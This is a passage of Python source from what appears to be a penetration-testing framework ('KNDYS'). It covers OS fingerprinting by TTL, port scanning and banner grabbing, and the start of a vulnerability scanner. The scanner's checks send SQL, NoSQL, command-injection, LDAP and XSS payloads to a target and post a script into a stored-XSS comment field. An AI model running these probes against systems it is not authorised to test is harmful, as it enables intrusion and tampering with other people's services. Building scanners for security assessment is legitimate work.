        http_insights = []
        banner_hits = []
        port_pattern_hits = []
        icmp_data = self._icmp_fingerprint(target, timing_profile)

        scores = {}

        def add_score(os_name, points, reason):
            entry = scores.setdefault(os_name, {'score': 0, 'evidence': []})
            entry['score'] = min(100, entry['score'] + points)
            entry['evidence'].append(reason)

        print(f"{Fore.BLUE}[*] Phase 1: ICMP Fingerprinting{Style.RESET_ALL}")
        if icmp_data.get('ttl') is not None:
            ttl_result = self._interpret_ttl(icmp_data['ttl'])
            if ttl_result:
                add_score(ttl_result['os'], ttl_result['score'], ttl_result['description'])
                hops = ttl_result.get('hops')
                hops_info = f" | Hops: ~{hops}" if hops is not None else ''
                print(f"{Fore.GREEN}[+] TTL {icmp_data['ttl']} suggests {ttl_result['os']}{hops_info}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] ICMP fingerprint unavailable (host may block ping){Style.RESET_ALL}")

        if port_scan:
            print(f"\n{Fore.BLUE}[*] Phase 2: TCP Port & Banner Analysis{Style.RESET_ALL}")
            port_list = self._build_port_list(deep_scan, custom_ports, max_ports)
            if not port_list:
                print(f"{Fore.YELLOW}[!] No ports selected for scanning{Style.RESET_ALL}")
            else:
                print(f"{Fore.CYAN}[*] Scanning up to {len(port_list)} ports...{Style.RESET_ALL}")
                port_results = self._scan_ports_for_os(target, port_list, timing_profile, banner_grab)
                ports_scanned = [entry['port'] for entry in port_results]
                if ports_scanned:
                    ports_scanned.sort()
                    print(f"{Fore.GREEN}[+] Open Ports: {', '.join(str(p) for p in ports_scanned)}{Style.RESET_ALL}")
                    port_pattern_hits = self._score_port_patterns(ports_scanned)
                    for hit in port_pattern_hits:
                        add_score(hit['os'], hit['score'], hit['reason'])
                    banner_hits = self._score_banners(port_results)
                    for hit in banner_hits:
                        add_score(hit['os'], hit['score'], hit['reason'])
                    if banner_grab:
                        http_insights = self._collect_http_insights(target, ports_scanned, timing_profile['timeout'])
                        for insight in http_insights:
                            if insight.get('os_guess'):
                                add_score(insight['os_guess'], 18, f"HTTP header ({insight['port']}) suggests {insight['os_guess']}")
                else:
                    print(f"{Fore.YELLOW}[!] No open ports detected during scan{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}[!] Port scanning disabled by user option{Style.RESET_ALL}")

        os_matches = self._build_os_match_list(scores)
        if os_matches:
            best_match = os_matches[0]
        else:
            best_match = {'os': 'Unknown', 'confidence': 5, 'evidence': ['Insufficient data']}
            os_matches = [best_match]
        elapsed = time.time() - start_time

        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}OS DETECTION RESULTS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        for idx, match in enumerate(os_matches[:3], 1):
            bar = self._render_confidence_bar(match['confidence'])
            color = Fore.GREEN if idx == 1 else Fore.YELLOW
            print(f"{color}{idx}. {match['os']:<28} {bar} {match['confidence']}%{Style.RESET_ALL}")
            for evidence in match['evidence'][:2]:
                print(f" - {evidence}")
        if not os_matches:
            print(f"{Fore.YELLOW}[!] Unable to determine OS with confidence{Style.RESET_ALL}")

        if port_results:
            print(f"\n{Fore.CYAN}Service Fingerprints:{Style.RESET_ALL}")
            for entry in port_results:
                banner = entry.get('banner', '')
                preview = f" - {banner[:80]}" if banner else ''
                print(f" {Fore.GREEN}• {entry['port']}/{entry['service']}{preview}{Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}[*] Scan completed in {elapsed:.2f}s{Style.RESET_ALL}\n")

        scan_data = {
            'target': target,
            'timestamp': timestamp,
            'scan_duration': elapsed,
            'timing': timing,
            'options': {
                'deep_scan': deep_scan,
                'port_scan': port_scan,
                'banner_grab': banner_grab,
                'max_ports': max_ports,
                'custom_ports': custom_ports
            },
            'fingerprints': {
                'icmp': icmp_data,
                'port_patterns': port_pattern_hits,
                'banner_hits': banner_hits,
                'http': http_insights
            },
            'ports': port_results,
            'open_ports': ports_scanned,
            'os_matches': os_matches,
            'best_match': best_match,
            'confidence_score': best_match.get('confidence', 0)
        }

        self._export_os_detection_results(target, scan_data)

    def _get_timing_profile(self, timing):
        profiles = {
            'fast': {'timeout': 0.5, 'retries': 1},
            'normal': {'timeout': 1.0, 'retries': 2},
            'slow': {'timeout': 2.0, 'retries': 3}
        }
        return profiles.get(timing, profiles['normal'])

    def _build_port_list(self, deep_scan, custom_ports, max_ports):
        base_ports = [
            21, 22, 23, 25, 53, 80, 110, 143, 161, 389, 443, 445, 465, 587, 631,
            993, 995, 135, 137, 138, 139, 1433, 1521, 2049, 2375, 2376, 27017,
            3128, 3306, 3389, 5432, 5900, 5985, 6379, 8080, 8443, 11211
        ]
        extended_ports = [
            67, 68, 69, 88, 111, 873, 902, 9200, 9300, 9999, 10000, 27018, 5000,
            5601, 7000, 8000, 8081, 8088, 9000, 9090, 27019, 4444, 50000
        ]
        ports = set(base_ports)
        if deep_scan:
            ports.update(extended_ports)
        ports.update(self._parse_custom_ports(custom_ports))
        ordered = sorted(p for p in ports if 1 <= p <= 65535)
        return ordered[:max_ports]

    def _parse_custom_ports(self, custom_ports):
        result = set()
        if not custom_ports:
            return result
        for chunk in custom_ports.split(','):
            token = chunk.strip()
            if not token:
                continue
            if '-' in token:
                start, end = token.split('-', 1)
                if start.isdigit() and end.isdigit():
                    for port in range(int(start), int(end) + 1):
                        if 1 <= port <= 65535:
                            result.add(port)
            elif token.isdigit():
                port = int(token)
                if 1 <= port <= 65535:
                    result.add(port)
        return result

    def _scan_ports_for_os(self, target, ports, timing_profile, banner_grab):
        if not ports:
            return []
        timeout = timing_profile['timeout']
        retries = timing_profile['retries']
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(64, len(ports))) as executor:
            future_map = {
                executor.submit(self._scan_single_port, target, port, timeout, retries, banner_grab): port
                for port in ports
            }
            for future in concurrent.futures.as_completed(future_map):
                data = future.result()
                if data:
                    results.append(data)
        return sorted(results, key=lambda item: item['port'])

    def _scan_single_port(self, target, port, timeout, retries, banner_grab):
        service = self.get_service_name_extended(port) if hasattr(self, 'get_service_name_extended') else self.get_service_name(port)
        tls_ports = {443, 8443, 9443, 10443}
        for _ in range(retries):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            start = time.time()
            try:
                result = sock.connect_ex((target, port))
                if result == 0:
                    latency = (time.time() - start) * 1000
                    banner = ''
                    if banner_grab:
                        if port in tls_ports:
                            banner = self._grab_tls_banner(target, port, timeout)
                        else:
                            banner = self._grab_service_banner(sock, target, port, timeout)
                    return {
                        'port': port,
                        'service': service,
                        'protocol': 'tcp',
                        'latency': round(latency, 2),
                        'banner': banner or ''
                    }
            except Exception:
                continue
            finally:
                try:
                    sock.close()
                except Exception:
                    pass
        return None

    def _grab_tls_banner(self, target, port, timeout):
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with socket.create_connection((target, port), timeout=timeout) as sock:
                with context.wrap_socket(sock, server_hostname=target) as tls_sock:
                    request = f"HEAD / HTTP/1.0\r\nHost: {target}\r\nUser-Agent: {self.config['user_agent']}\r\nConnection: close\r\n\r\n"
                    tls_sock.sendall(request.encode())
                    data = tls_sock.recv(256)
                    return data.decode(errors='ignore').strip()
        except Exception:
            return ''

    def _collect_http_insights(self, target, open_ports, timeout):
        insights = []
        http_ports = {
            80: 'http', 8080: 'http', 8000: 'http', 8008: 'http', 8081: 'http',
            443: 'https', 8443: 'https', 9443: 'https', 9444: 'https'
        }
        for port in open_ports:
            if port not in http_ports:
                continue
            scheme = http_ports[port]
            if (scheme == 'http' and port in {80}) or (scheme == 'https' and port in {443}):
                url = f"{scheme}://{target}"
            else:
                url = f"{scheme}://{target}:{port}"
            try:
                response = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
                server = response.headers.get('Server', '')
                powered = response.headers.get('X-Powered-By', '')
                os_guess = None
                header_blob = f"{server} {powered}".lower()
                if 'ubuntu' in header_blob:
                    os_guess = 'Ubuntu Linux'
                elif 'debian' in header_blob:
                    os_guess = 'Debian Linux'
                elif 'centos' in header_blob or 'red hat' in header_blob:
                    os_guess = 'CentOS/Red Hat'
                elif 'microsoft-iis' in header_blob:
                    os_guess = 'Windows Server'
                elif 'freebsd' in header_blob:
                    os_guess = 'FreeBSD'
                insights.append({
                    'port': port,
                    'url': url,
                    'status': response.status_code,
                    'server': server,
                    'powered_by': powered,
                    'os_guess': os_guess
                })
            except Exception:
                continue
        return insights

    def _icmp_fingerprint(self, target, timing_profile):
        result = {
            'method': None,
            'ttl': None,
            'response_time': None,
            'raw_output': None
        }
        scapy_available = globals().get('SCAPY_AVAILABLE', False)
        timeout = timing_profile['timeout']
        retries = timing_profile['retries']
        if scapy_available:
            try:
                from scapy.all import IP, ICMP, sr1, conf
                conf.verb = 0
                for _ in range(retries):
                    pkt = IP(dst=target)/ICMP()
                    start = time.time()
                    reply = sr1(pkt, timeout=timeout)
                    if reply:
                        result['method'] = 'scapy'
                        result['ttl'] = int(reply.ttl)
                        result['response_time'] = round((time.time() - start) * 1000, 2)
                        return result
            except Exception:
                pass
        ping_data = self._system_ping(target, timeout, retries)
        if ping_data:
            result.update(ping_data)
        return result

    def _system_ping(self, target, timeout, retries):
        param_count = '-n' if os.name == 'nt' else '-c'
        param_timeout = '-w' if os.name == 'nt' else '-W'
        timeout_value = str(max(1, int(timeout * 1000))) if os.name == 'nt' else str(max(1, int(timeout)))
        command = ['ping', param_count, '1', param_timeout, timeout_value, target]
        for _ in range(retries):
            try:
                output = subprocess.run(command, capture_output=True, text=True, timeout=timeout + 1)
                if output.returncode == 0:
                    text = output.stdout.lower()
                    ttl_match = re.search(r'ttl[=:\s](\d+)', text)
                    time_match = re.search(r'time[=<]\s*([0-9.]+)\s*ms', text)
                    ttl = int(ttl_match.group(1)) if ttl_match else None
                    latency = float(time_match.group(1)) if time_match else None
                    return {
                        'method': 'system-ping',
                        'ttl': ttl,
                        'response_time': latency,
                        'raw_output': output.stdout.strip()
                    }
            except Exception:
                continue
        return None

    def _interpret_ttl(self, ttl):
        if ttl is None:
            return None
        profiles = [
            {'base': 255, 'label': 'Network Device', 'threshold': 200, 'score': 28},
            {'base': 128, 'label': 'Windows', 'threshold': 90, 'score': 30},
            {'base': 64, 'label': 'Linux/Unix', 'threshold': 35, 'score': 30},
            {'base': 32, 'label': 'Legacy Windows/Embedded', 'threshold': 20, 'score': 20}
        ]
        for profile in profiles:
            if ttl <= profile['base'] and ttl >= profile['threshold']:
                hops = max(0, profile['base'] - ttl)
                return {
                    'os': profile['label'],
                    'score': profile['score'],
                    'description': f"TTL {ttl} aligns with {profile['label']} profile",
                    'hops': hops
                }
        return {
            'os': 'Unknown',
            'score': 5,
            'description': f"TTL {ttl} does not match known profiles",
            'hops': None
        }

    def _score_port_patterns(self, open_ports):
        if not open_ports:
            return []
        patterns = {
            'Windows': {135, 139, 445, 3389, 5985},
            'Linux/Unix': {22, 111, 2049},
            'macOS': {22, 548, 5900},
            'Network Device': {23, 161, 514, 8291},
            'Database Server': {1433, 1521, 3306, 5432, 27017},
            'Mail Server': {25, 110, 143, 587, 993, 995}
        }
        open_set = set(open_ports)
        hits = []
        for os_name, ports in patterns.items():
            overlap = open_set.intersection(ports)
            if overlap:
                score = 5 * len(overlap)
                hits.append({
                    'os': os_name,
                    'score': score,
                    'reason': f"Characteristic ports detected: {', '.join(str(p) for p in sorted(overlap))}"
                })
        return hits

    def _score_banners(self, services):
        if not services:
            return []
        signatures = [
            (r'ubuntu', 'Ubuntu Linux', 20, 'Banner references Ubuntu'),
            (r'debian', 'Debian Linux', 18, 'Banner references Debian'),
            (r'centos|red hat|rhel', 'CentOS/Red Hat', 18, 'Banner references CentOS/Red Hat'),
            (r'amazon linux', 'Amazon Linux', 18, 'Banner references Amazon Linux'),
            (r'microsoft-iis/10\.0', 'Windows Server 2016/2019', 25, 'IIS 10 banner detected'),
            (r'microsoft-iis/8\.5', 'Windows Server 2012 R2', 22, 'IIS 8.5 banner detected'),
            (r'microsoft-iis', 'Windows Server', 20, 'IIS banner detected'),
            (r'openbsd', 'OpenBSD', 20, 'OpenBSD mentioned in banner'),
            (r'freebsd', 'FreeBSD', 20, 'FreeBSD mentioned in banner'),
            (r'netbsd', 'NetBSD', 18, 'NetBSD mentioned in banner'),
            (r'ros_ssh|mikrotik', 'MikroTik RouterOS', 25, 'RouterOS SSH banner'),
            (r'dropbear', 'Embedded Linux', 15, 'Dropbear SSH server'),
            (r'cisco', 'Cisco IOS', 25, 'Cisco banner detected'),
            (r'sunos|solaris', 'Solaris', 22, 'Solaris banner detected'),
            (r'aix', 'IBM AIX', 22, 'AIX banner detected'),
            (r'apache', 'Linux/Unix', 10, 'Apache banner detected'),
            (r'nginx', 'Linux/Unix', 10, 'Nginx banner detected')
        ]
        compiled = [(re.compile(pattern, re.IGNORECASE), os_name, score, reason) for pattern, os_name, score, reason in signatures]
        hits = []
        for entry in services:
            banner = entry.get('banner', '')
            if not banner:
                continue
            for regex, os_name, score, reason in compiled:
                if regex.search(banner):
                    hits.append({
                        'os': os_name,
                        'score': score,
                        'reason': f"Port {entry['port']} banner -> {reason}"
                    })
        return hits

    def _render_confidence_bar(self, value):
        filled = int(round(value / 10))
        filled = max(0, min(filled, 10))
        return f"[{('#' * filled).ljust(10, '.')}]"

    def _build_os_match_list(self, scores):
        matches = []
        for os_name, data in scores.items():
            matches.append({
                'os': os_name,
                'confidence': int(min(100, round(data['score']))),
                'evidence': data['evidence']
            })
        matches.sort(key=lambda item: item['confidence'], reverse=True)
        return matches

    def _export_os_detection_results(self, target, scan_data):
        timestamp = scan_data['timestamp']
        safe_target = target.replace(':', '_').replace('/', '_')
        json_file = f'os_detect_{safe_target}_{timestamp}.json'
        with open(json_file, 'w', encoding='utf-8') as fh:
            json.dump(scan_data, fh, indent=2)

        txt_file = f'os_detect_{safe_target}_{timestamp}_report.txt'
        with open(txt_file, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
            fh.write("OS DETECTION REPORT - KNDYS FRAMEWORK\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Target: {scan_data['target']}\n")
            fh.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n")
            fh.write(f"Duration: {scan_data['scan_duration']:.2f}s\n")
            fh.write(f"Timing Profile: {scan_data['timing']}\n")
            fh.write("\nOS Detection Results:\n")
            fh.write("-" * 78 + "\n")
            for match in scan_data['os_matches'][:5]:
                fh.write(f" - {match['os']}: {match['confidence']}% confidence\n")
                for evidence in match['evidence'][:3]:
                    fh.write(f" * {evidence}\n")
            fh.write("\n")
            icmp = scan_data['fingerprints'].get('icmp') or {}
            if icmp:
                fh.write("ICMP Fingerprint:\n")
                fh.write("-" * 78 + "\n")
                fh.write(f" Method: {icmp.get('method', 'n/a')}\n")
                fh.write(f" TTL: {icmp.get('ttl', 'n/a')}\n")
                fh.write(f" Response Time: {icmp.get('response_time', 'n/a')} ms\n\n")
            if scan_data['open_ports']:
                fh.write(f"Open Ports ({len(scan_data['open_ports'])}):\n")
                fh.write("-" * 78 + "\n")
                fh.write(f" {', '.join(str(p) for p in scan_data['open_ports'])}\n\n")
                fh.write("Service Analysis:\n")
                fh.write("-" * 78 + "\n")
                for entry in scan_data['ports']:
                    fh.write(f" Port {entry['port']}/{entry['service']}\n")
                    if entry.get('banner'):
                        fh.write(f" Banner: {entry['banner'][:120]}\n")
                fh.write("\n")
            if scan_data['fingerprints'].get('http'):
                fh.write("HTTP Header Insights:\n")
                fh.write("-" * 78 + "\n")
                for insight in scan_data['fingerprints']['http']:
                    fh.write(f" Port {insight['port']} ({insight['url']}):\n")
                    fh.write(f" Server: {insight.get('server', 'n/a')}\n")
                    fh.write(f" X-Powered-By: {insight.get('powered_by', 'n/a')}\n")
                    if insight.get('os_guess'):
                        fh.write(f" OS Indication: {insight['os_guess']}\n")
                fh.write("\n")

        print(f"{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f" • {json_file}")
        print(f" • {txt_file}")
    
    # ============ SCAN MODULES ============
    
    def run_vuln_scanner(self):
        """Comprehensive vulnerability scanner with 33 checks in 7 categories"""
        target = self.module_options['target']
        scan_type = self.module_options.get('scan_type', 'full')
        threads = int(self.module_options.get('threads', '5'))
        aggressive = self.module_options.get('aggressive', 'false').lower() == 'true'
        stealth = self.module_options.get('stealth_mode', 'false').lower() == 'true'
        
        print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{' '*15}ADVANCED VULNERABILITY SCANNER - KNDYS v3.0{' '*12}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}[*] Target: {target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Scan Type: {scan_type.upper()}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Threads: {threads} | Aggressive: {aggressive} | Stealth: {stealth}{Style.RESET_ALL}\n")
        
        vulnerabilities = []
        start_time = time.time()
        
        # Define 33 checks organized in 7 categories
        categories = {
            'Injection': [
                ("SQL Injection (Error-based)", lambda: self._check_sql_error_based(target)),
                ("SQL Injection (Time-based)", lambda: self._check_sql_time_based(target)),
                ("NoSQL Injection", lambda: self._check_nosql_injection(target)),
                ("Command Injection", lambda: self._check_command_injection_advanced(target)),
                ("LDAP Injection", lambda: self._check_ldap_injection(target)),
            ],
            'XSS': [
                ("Reflected XSS", lambda: self._check_reflected_xss(target)),
                ("Stored XSS", lambda: self._check_stored_xss(target)),
                ("DOM-based XSS", lambda: self._check_dom_xss(target)),
            ],
            'Broken Authentication': [
                ("Weak Authentication", lambda: self._check_weak_auth(target)),
                ("Session Management", lambda: self._check_session_mgmt(target)),
                ("JWT Vulnerabilities", lambda: self._check_jwt_vulns(target)),
            ],
            'Sensitive Data': [
                ("SSL/TLS Configuration", lambda: self._check_ssl_config(target)),
                ("Sensitive Files Exposed", lambda: self._check_sensitive_files(target)),
                ("Information Disclosure", lambda: self._check_info_disclosure(target)),
                ("Security Headers", lambda: self._check_security_headers_advanced(target)),
            ],
            'XXE': [
                ("XML External Entity (XXE)", lambda: self._check_xxe_advanced(target)),
                ("DTD Injection", lambda: self._check_dtd_injection(target)),
            ],
            'Access Control': [
                ("IDOR Detection", lambda: self._check_idor(target)),
                ("Path Traversal", lambda: self._check_path_traversal_advanced(target)),
                ("Forced Browsing", lambda: self._check_forced_browsing(target)),
            ],
            'Security Misconfiguration': [
                ("CORS Misconfiguration", lambda: self._check_cors(target)),
                ("HTTP Methods", lambda: self._check_http_methods(target)),
                ("Default Credentials", lambda: self._check_default_creds(target)),
                ("Verbose Error Messages", lambda: self._check_verbose_errors(target)),
                ("Debug Mode", lambda: self._check_debug_mode(target)),
                ("CSRF Protection", lambda: self._check_csrf_advanced(target)),
                ("Clickjacking", lambda: self._check_clickjacking(target)),
                ("Open Redirect", lambda: self._check_open_redirect(target)),
                ("SSRF", lambda: self._check_ssrf_advanced(target)),
                ("Outdated JS Libraries", lambda: self._check_outdated_libs(target)),
                ("API Documentation Exposed", lambda: self._check_api_docs(target)),
                ("Backup Files Accessible", lambda: self._check_backup_files(target)),
                ("Host Header Injection", lambda: self._check_host_header_injection(target)),
            ],
        }
        
        # Apply scan type filter
        if scan_type == 'quick':
            # Only critical checks
            categories = {k: v[:2] for k, v in categories.items()}
        elif scan_type == 'web':
            # Focus on web-specific
            categories = {k: v for k, v in categories.items() if k in ['XSS', 'Injection', 'Security Misconfiguration']}
        elif scan_type == 'api':
            # Focus on API security
            categories = {k: v for k, v in categories.items() if k in ['Injection', 'Broken Authentication', 'Access Control']}
        
        # Execute checks by category
        check_count = 0
        total_checks = sum(len(checks) for checks in categories.values())
        
        for category, checks in categories.items():
            print(f"\n{Fore.CYAN}[*] Category: {category}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'─'*70}{Style.RESET_ALL}")
            
            for check_name, check_func in checks:
                check_count += 1
                print(f"{Fore.YELLOW}[{check_count}/{total_checks}] Checking: {check_name}...{Style.RESET_ALL}", end='\r')
                
                try:
                    result = check_func()
                    if result:
                        severity, details, remediation = result
                        vulnerabilities.append({
                            'category': category,
                            'name': check_name,
                            'severity': severity,
                            'details': details,
                            'remediation': remediation
                        })
                        severity_color = self._get_severity_color(severity)
                        print(f"{severity_color}[+] {severity.upper()}: {check_name}{Style.RESET_ALL}")
                        print(f"{Fore.WHITE} └─ {details}{Style.RESET_ALL}")
                        if stealth:
                            time.sleep(1) # Delay for stealth mode
                except Exception as e:
                    if aggressive:
                        print(f"{Fore.RED}[-] Error in {check_name}: {str(e)}{Style.RESET_ALL}")
        
        # Calculate statistics
        elapsed = time.time() - start_time
        critical = sum(1 for v in vulnerabilities if v['severity'] == 'Critical')
        high = sum(1 for v in vulnerabilities if v['severity'] == 'High')
        medium = sum(1 for v in vulnerabilities if v['severity'] == 'Medium')
        low = sum(1 for v in vulnerabilities if v['severity'] == 'Low')
        info = sum(1 for v in vulnerabilities if v['severity'] == 'Info')
        
        # Print summary
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}VULNERABILITY SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}\n")
            print(f"{Fore.WHITE}Risk Distribution:{Style.RESET_ALL}")
            if critical > 0:
                print(f" {Fore.RED}● Critical: {critical}{Style.RESET_ALL}")
            if high > 0:
                print(f" {Fore.LIGHTRED_EX}● High: {high}{Style.RESET_ALL}")
            if medium > 0:
                print(f" {Fore.YELLOW}● Medium: {medium}{Style.RESET_ALL}")
            if low > 0:
                print(f" {Fore.LIGHTYELLOW_EX}● Low: {low}{Style.RESET_ALL}")
            if info > 0:
                print(f" {Fore.CYAN}● Info: {info}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No vulnerabilities detected{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Scan completed in {elapsed:.2f} seconds{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Checks performed: {check_count}/{total_checks}{Style.RESET_ALL}\n")
        
        # Export results
        self._export_vuln_scan_results(target, scan_type, vulnerabilities, elapsed)
        
        return vulnerabilities
    
    # ============ HELPER FUNCTIONS ============
    
    def _get_severity_color(self, severity):
        """Get color based on severity"""
        colors = {
            'Critical': Fore.RED,
            'High': Fore.LIGHTRED_EX,
            'Medium': Fore.YELLOW,
            'Low': Fore.LIGHTYELLOW_EX,
            'Info': Fore.CYAN
        }
        return colors.get(severity, Fore.WHITE)
    
    def _export_vuln_scan_results(self, target, scan_type, vulnerabilities, elapsed):
        """Export vulnerability scan results to JSON and TXT"""
        timestamp = int(time.time())
        
        # JSON Export
        json_data = {
            'target': target,
            'scan_type': scan_type,
            'timestamp': timestamp,
            'scan_time': f'{elapsed:.2f}s',
            'total_vulns': len(vulnerabilities),
            'severity_breakdown': {
                'Critical': sum(1 for v in vulnerabilities if v['severity'] == 'Critical'),
                'High': sum(1 for v in vulnerabilities if v['severity'] == 'High'),
                'Medium': sum(1 for v in vulnerabilities if v['severity'] == 'Medium'),
                'Low': sum(1 for v in vulnerabilities if v['severity'] == 'Low'),
                'Info': sum(1 for v in vulnerabilities if v['severity'] == 'Info'),
            },
            'vulnerabilities': vulnerabilities
        }
        
        json_file = f'vuln_scan_{target.replace("http://", "").replace("https://", "").replace("/", "_")}_{timestamp}.json'
        with open(json_file, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        # TXT Export
        txt_file = f'vuln_scan_{target.replace("http://", "").replace("https://", "").replace("/", "_")}_{timestamp}.txt'
        with open(txt_file, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("VULNERABILITY SCAN REPORT - KNDYS FRAMEWORK v3.0\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"Target: {target}\n")
            f.write(f"Scan Type: {scan_type.upper()}\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n")
            f.write(f"Duration: {elapsed:.2f} seconds\n")
            f.write(f"Total Vulnerabilities: {len(vulnerabilities)}\n\n")
            
            # Risk distribution
            f.write("Risk Distribution:\n")
            for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
                count = sum(1 for v in vulnerabilities if v['severity'] == severity)
                if count > 0:
                    f.write(f" {severity}: {count}\n")
            f.write("\n" + "=" * 70 + "\n\n")
            
            # Group by category
            categories = {}
            for vuln in vulnerabilities:
                cat = vuln['category']
                if cat not in categories:
                    categories[cat] = []
                categories[cat].append(vuln)
            
            for category, vulns in categories.items():
                f.write(f"CATEGORY: {category}\n")
                f.write("-" * 70 + "\n")
                for vuln in vulns:
                    f.write(f"[{vuln['severity'].upper()}] {vuln['name']}\n")
                    f.write(f"Details: {vuln['details']}\n")
                    f.write(f"Remediation: {vuln['remediation']}\n")
                    f.write("\n")
                f.write("\n")
        
        print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f" • {json_file}")
        print(f" • {txt_file}")
    
    # ============ 33 CHECK FUNCTIONS ============
    
    # Category 1: Injection (5 checks)
    
    def _check_sql_error_based(self, url):
        """Check for error-based SQL injection"""
        payloads = ["'", '"', "')", "';", "' AND 1=CONVERT(int, @@version)--", "' OR 1=CAST(@@version AS INT)--"]
        error_patterns = [
            r"SQL.*error", r"Warning.*mysql", r"PostgreSQL.*ERROR", r"ORA-\d+",
            r"Microsoft.*Driver", r"syntax.*error", r"unclosed.*quotation", r"unterminated.*string"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return ('Critical', f"SQL error with payload: {payload}", "Use parameterized queries, input validation")
            except:
                pass
        return None
    
    def _check_sql_time_based(self, url):
        """Check for time-based SQL injection"""
        time_payloads = ["' OR SLEEP(5)--", "' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--", "' OR pg_sleep(5)--"]
        
        for payload in time_payloads:
            try:
                test_url = f"{url}{payload}"
                start = time.time()
                requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=15, verify=False)
                elapsed = time.time() - start
                if elapsed > 4:
                    return ('Critical', f"Time-based SQLi with delay: {elapsed:.2f}s", "Use parameterized queries")
            except requests.exceptions.Timeout:
                return ('Critical', f"Timeout-based SQLi with payload: {payload}", "Use parameterized queries")
            except:
                pass
        return None
    
    def _check_nosql_injection(self, url):
        """Check for NoSQL injection (MongoDB)"""
        payloads = ["[$ne]=1", "{'$ne': null}", "{'$gt': ''}", "admin'||'1'=='1"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if response.status_code == 200 and len(response.text) > 100:
                    return ('High', f"Potential NoSQL injection with: {payload}", "Sanitize NoSQL queries, use ODM")
            except:
                pass
        return None
    
    def _check_command_injection_advanced(self, url):
        """Check for command injection"""
        payloads = ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "|| ping -c 5 127.0.0.1"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                start = time.time()
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=15, verify=False)
                elapsed = time.time() - start
                if elapsed > 4 or 'uid=' in response.text:
                    return ('Critical', f"Command injection detected: {payload}", "Never execute user input, use safe APIs")
            except:
                pass
        return None
    
    def _check_ldap_injection(self, url):
        """Check for LDAP injection"""
        payloads = ["*", "*)(uid=*", "admin*", "*()|&'"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if 'ldap' in response.text.lower() or 'directory' in response.text.lower():
                    return ('Medium', f"Potential LDAP injection: {payload}", "Escape LDAP special characters")
            except:
                pass
        return None
    
    # Category 2: XSS (3 checks)
    
    def _check_reflected_xss(self, url):
        """Check for reflected XSS"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if payload in response.text or payload.replace('"', '&quot;') in response.text:
                    return ('High', f"Reflected XSS with: {payload[:30]}...", "Encode output, use CSP headers")
            except:
                pass
        return None
    
    def _check_stored_xss(self, url):
        """Check for stored XSS (basic check)"""
        payload = f"<script>alert('stored-{int(time.time())}')</script>"
        try:
            requests.post(url, data={'comment': payload}, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            if payload in response.text:
                return ('Critical', "Stored XSS detected in comment field", "Sanitize stored data, encode on output")
        except:
            pass
        return None
    
    def _check_dom_xss(self, url):
        """Check for DOM-based XSS"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            dangerous_sinks = ['innerHTML', 'outerHTML', 'document.write', 'eval(', 'setTimeout', 'location.href']
            if any(sink in response.text for sink in dangerous_sinks):
                return ('Medium', "Potential DOM XSS sinks detected", "Avoid unsafe DOM manipulation")
        except:
